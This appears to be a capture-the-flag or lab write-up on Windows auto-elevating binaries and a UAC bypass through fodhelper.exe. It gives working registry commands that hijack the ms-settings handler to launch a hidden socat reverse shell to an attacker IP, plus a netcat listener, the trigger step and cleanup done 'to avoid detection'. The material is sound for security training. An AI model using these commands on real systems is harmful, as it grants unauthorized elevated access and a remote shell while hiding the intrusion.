# Auto-Elevating Processes and UAC Bypass

## AutoElevate

Some Windows executables can auto-elevate, achieving high Integrity Level (IL) without user intervention. This applies to most Control Panel functions and certain Windows executables.

### Requirements for Auto-Elevation

- The executable must be signed by the Windows Publisher.
- It must reside in a trusted directory (e.g., `%SystemRoot%\System32\` or `%ProgramFiles%`).
- Executable files (`.exe`) must declare the `autoElevate` element in their manifest.

To check a file's manifest, use [Sysinternals sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck):

```shell
C:\tools\> sigcheck64.exe -m c:\windows\system32\msconfig.exe
...
<asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <dpiAware>true</dpiAware>
        <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
</asmv3:application>
```

- `mmc.exe` auto-elevates depending on the `.msc` snap-in.
- Windows maintains a list of executables that auto-elevate even without the manifest (e.g., `pkgmgr.exe`, `spinstall.exe`).
- COM objects can request auto-elevation via registry keys ([docs](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)).

---

## Case Study: `fodhelper.exe`

`fodhelper.exe` manages Windows optional features and can auto-elevate with default UAC settings. Unlike `msconfig.exe`, `fodhelper.exe` can be abused without GUI access.

### Attack Overview

- Attackers can use `fodhelper.exe` from a medium integrity shell to spawn a high integrity process.
- Discovered by @winscripting and used by Glupteba malware.

#### How It Works

- Windows uses the registry to determine which application opens a file, using the Programmatic ID (ProgID).
- `HKEY_CLASSES_ROOT` is a merged view of:
    - `HKEY_LOCAL_MACHINE\Software\Classes` (system-wide)
    - `HKEY_CURRENT_USER\Software\Classes` (user-specific, takes priority)
- By creating a user-specific association for the `ms-settings` ProgID, attackers control the command executed by `fodhelper.exe`.
- Since `fodhelper.exe` auto-elevates, any subprocess inherits a high integrity token, bypassing UAC.

---

## Practical Example: Bypassing UAC with `fodhelper.exe`

Suppose you have a backdoor shell on a target (member of Administrators, but with medium integrity):

```shell
user@kali$ nc MACHINE_IP 9999
Microsoft Windows [Version ...]
C:\Windows\system32>whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

### Registry Setup

Set registry values to associate `ms-settings` with a reverse shell:

```shell
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
C:\> reg add %REG_KEY% /d %CMD% /f
```

> **Note:** The empty `DelegateExecute` value is required for the exploit.

### Listener Setup

On your machine:

```shell
nc -lvp 4444
```

### Trigger the Exploit

On the target:

```shell
C:\> fodhelper.exe
```

You should receive a high integrity shell:

```shell
user@kali$ nc -lvp 4444
...
C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

---

## Retrieving the Flag

From the high integrity shell:

```shell
C:\> C:\flags\GetFlag-fodhelper.exe
```

> **Note:** The flag is only available if UAC was bypassed via `fodhelper.exe` and from a high integrity shell.

---

## Cleanup

Remove registry artefacts to avoid detection:

```shell
reg delete HKCU\Software\Classes\ms-settings\ /f
```

> **Note:** Always clean up after exploitation to prevent interference with future tasks.
